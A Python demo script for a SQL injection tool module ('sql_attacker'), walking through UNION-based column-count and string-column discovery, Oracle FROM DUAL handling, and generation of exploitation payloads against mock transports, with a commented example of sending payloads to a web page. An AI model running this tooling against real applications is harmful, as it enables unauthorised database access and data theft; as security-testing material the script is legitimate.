"""
SQL Fingerprinter Usage Demo

This script demonstrates how to use the SqlFingerprinter module to automatically
discover column count and string-type columns for UNION-based SQL injection.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.sql_fingerprinter import SqlFingerprinter, DatabaseType


def example_transport_function(payload):
    """
    Example transport function that sends HTTP requests.
    
    In a real scenario, this would use requests library or similar
    to send the payload to the vulnerable application.
    
    Args:
        payload: SQL injection payload to send
        
    Returns:
        Dict with 'status_code', 'content', 'length' keys
    """
    # This is a mock implementation for demo purposes
    # In reality, you would do something like:
    #
    # import requests
    # response = requests.get(f"http://example.com/page?id={payload}")
    # return {
    #     'status_code': response.status_code,
    #     'content': response.text,
    #     'length': len(response.text)
    # }
    
    # Mock response for demo
    if "UNION SELECT NULL,NULL,NULL" in payload:
        return {
            'status_code': 200,
            'content': '<html>Success! Extra data appeared</html>',
            'length': 42
        }
    elif "'SQLFingerprint'" in payload:
        return {
            'status_code': 200,
            'content': '<html>SQLFingerprint marker visible</html>',
            'length': 45
        }
    else:
        return {
            'status_code': 500,
            'content': 'MySQL syntax error',
            'length': 18
        }


def demo_basic_usage():
    """Demonstrate basic usage of SqlFingerprinter"""
    print("=" * 70)
    print("DEMO 1: Basic Column Count Discovery")
    print("=" * 70)
    
    # Create transport function
    transport = example_transport_function
    
    # Initialize fingerprinter
    fingerprinter = SqlFingerprinter(transport, verbose=True)
    
    # Discover column count
    print("\nDiscovering column count...")
    result = fingerprinter.discover_column_count(max_columns=10)
    
    if result.success:
        print(f"\n✓ SUCCESS: Found {result.column_count} columns")
    else:
        print("\n✗ FAILED: Could not determine column count")
    
    print("\n" + "=" * 70)


def demo_string_column_discovery():
    """Demonstrate string column discovery"""
    print("\nDEMO 2: String Column Discovery")
    print("=" * 70)
    
    transport = example_transport_function
    fingerprinter = SqlFingerprinter(transport, verbose=True)
    
    # First discover column count
    col_result = fingerprinter.discover_column_count(max_columns=10)
    
    if col_result.success:
        # Then discover string columns
        print(f"\nDiscovering string columns for {col_result.column_count} columns...")
        string_result = fingerprinter.discover_string_columns(col_result.column_count)
        
        if string_result.success:
            print(f"\n✓ SUCCESS: Found {len(string_result.string_columns)} string-capable columns")
            print(f"  Column positions (0-indexed): {string_result.string_columns}")
            print(f"  Column positions (1-indexed): {[i+1 for i in string_result.string_columns]}")
    
    print("\n" + "=" * 70)


def demo_full_fingerprint():
    """Demonstrate full fingerprinting process"""
    print("\nDEMO 3: Full Fingerprinting (Column Count + String Detection)")
    print("=" * 70)
    
    transport = example_transport_function
    fingerprinter = SqlFingerprinter(transport, verbose=True)
    
    # Perform full fingerprint
    result = fingerprinter.full_fingerprint(max_columns=10)
    
    # Display formatted report
    print("\n" + fingerprinter.format_report(result))
    
    print("=" * 70)


def demo_exploitation_payloads():
    """Demonstrate exploitation payload generation"""
    print("\nDEMO 4: Generate Exploitation Payloads")
    print("=" * 70)
    
    transport = example_transport_function
    fingerprinter = SqlFingerprinter(
        transport,
        verbose=False,
        database_type=DatabaseType.MYSQL
    )
    
    # Perform fingerprinting
    result = fingerprinter.full_fingerprint(max_columns=10)
    
    if result.success and result.string_columns:
        print(f"\nGenerating exploitation payloads...")
        print(f"Target: MySQL database")
        print(f"Columns: {result.column_count}")
        print(f"String columns: {result.string_columns}")
        
        payloads = fingerprinter.generate_exploitation_payloads(
            column_count=result.column_count,
            string_columns=result.string_columns
        )
        
        print(f"\nGenerated {len(payloads)} payloads:")
        for i, payload in enumerate(payloads, 1):
            print(f"  {i}. {payload}")
    
    print("\n" + "=" * 70)


def demo_oracle_handling():
    """Demonstrate Oracle FROM DUAL handling"""
    print("\nDEMO 5: Oracle Database Handling (FROM DUAL)")
    print("=" * 70)
    
    def oracle_transport(payload):
        """Mock Oracle database transport"""
        if "FROM DUAL" in payload and "UNION SELECT NULL,NULL,NULL" in payload:
            return {
                'status_code': 200,
                'content': '<html>Oracle query succeeded</html>',
                'length': 35
            }
        elif "UNION SELECT" in payload and "FROM DUAL" not in payload:
            return {
                'status_code': 500,
                'content': 'ORA-00923: FROM keyword not found where expected',
                'length': 50
            }
        else:
            return {
                'status_code': 500,
                'content': 'ORA-01756: quoted string not properly terminated',
                'length': 50
            }
    
    # Initialize with Oracle database type
    fingerprinter = SqlFingerprinter(
        oracle_transport,
        verbose=True,
        database_type=DatabaseType.ORACLE
    )
    
    print("\nBuilding Oracle UNION payload...")
    payload = fingerprinter._build_union_payload(3)
    print(f"Generated payload: {payload}")
    print(f"✓ FROM DUAL automatically appended for Oracle")
    
    print("\n" + "=" * 70)


def demo_custom_marker():
    """Demonstrate custom marker usage"""
    print("\nDEMO 6: Custom Marker for String Detection")
    print("=" * 70)
    
    def custom_transport(payload):
        """Mock transport that recognizes custom marker"""
        if "'CustomXYZ'" in payload:
            return {
                'status_code': 200,
                'content': '<html>CustomXYZ visible in output</html>',
                'length': 40
            }
        elif "UNION SELECT NULL,NULL,NULL" in payload:
            return {
                'status_code': 200,
                'content': '<html>Success</html>',
                'length': 20
            }
        else:
            return {
                'status_code': 500,
                'content': 'Error',
                'length': 5
            }
    
    fingerprinter = SqlFingerprinter(custom_transport, verbose=True)
    
    # Use custom marker
    print("\nUsing custom marker 'CustomXYZ'...")
    result = fingerprinter.full_fingerprint(
        max_columns=10,
        marker="'CustomXYZ'"
    )
    
    if result.success:
        print(f"\n✓ Fingerprinting successful with custom marker")
        print(f"  Columns: {result.column_count}")
        print(f"  String columns: {result.string_columns}")
    
    print("\n" + "=" * 70)


def main():
    """Run all demos"""
    print("\n")
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 18 + "SQL FINGERPRINTER DEMO" + " " * 28 + "║")
    print("║" + " " * 68 + "║")
    print("║" + "  Automatic Column Count & String Type Discovery for UNION-based  " + "║")
    print("║" + "  SQL Injection Attacks" + " " * 45 + "║")
    print("╚" + "═" * 68 + "╝")
    print("\n")
    
    try:
        demo_basic_usage()
        input("\nPress Enter to continue to next demo...")
        
        demo_string_column_discovery()
        input("\nPress Enter to continue to next demo...")
        
        demo_full_fingerprint()
        input("\nPress Enter to continue to next demo...")
        
        demo_exploitation_payloads()
        input("\nPress Enter to continue to next demo...")
        
        demo_oracle_handling()
        input("\nPress Enter to continue to next demo...")
        
        demo_custom_marker()
        
        print("\n" + "=" * 70)
        print("All demos completed successfully!")
        print("=" * 70)
        
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()
